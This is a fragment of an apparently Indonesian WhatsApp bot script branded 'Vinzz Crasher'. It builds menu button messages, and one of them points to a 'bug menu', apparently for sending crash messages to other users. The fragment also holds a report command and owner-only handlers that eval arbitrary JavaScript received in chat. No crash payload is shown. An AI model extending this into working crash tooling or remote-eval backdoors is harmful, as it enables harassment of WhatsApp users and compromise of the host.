let family = `╭─❍ *TQTO FOR*
│ Vinzz Official *( Developer )*
│ Alllah SWT *( Good Me )*
│ Ortu *( My Suport )*
│ Dai *( My Friend )*
╰──────────────
`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Click here",
    sections: [
      {
        title: `🐉⃝⃝𝐕𝐢𝐧𝐳𝐳͢ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "⎋ Bugmenu",
            title: "menampilkan menu bug",
            description: "© By Vinzz",
            id: `.bugmenu`, 
          },   
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/uoqu46.jpg" },
	    gifPlayback: false,
        caption: family,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})
}
break
case "bot": {
let teks4 = `botz active anytime`
const buttons = [
{
buttonId: `.self`, 
buttonText: { 
displayText: 'Bot Self' 
}
},{
buttonId: `.public`,
buttonText: {
displayText: "Bot Public"
}
}
]

const buttonMessage = {
image: { url: "https://files.catbox.moe/uoqu46.jpg" },
	    gifPlayback: false,
        caption: teks4,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: loli
})

await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})};

break
case 'report': {
  if (!text) return m.reply(`Contoh: ${prefix + command} ada eror di fitur xxx, jelaskan permasalahan error agar di perbaiki`)
  let ownerNumber = '6285218951518' 
  let isi = `*Laporan Masuk*\n\nNomor: wa.me/${m.sender.split('@')[0]}\nPesan: ${text}`
  try {
    await vinzzoffc.sendMessage(ownerNumber + '@s.whatsapp.net', { text: isi }, { quoted: m })
    reply('Laporan kamu sudah dikirim ke owner, jika terjadinya error lagi silahkan report lagi jangan ragu.')
  } catch (e) {
    m.reply('Gagal mengirim laporan, silakan coba lagi nanti.')
    console.log(e)
  }
}

break
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});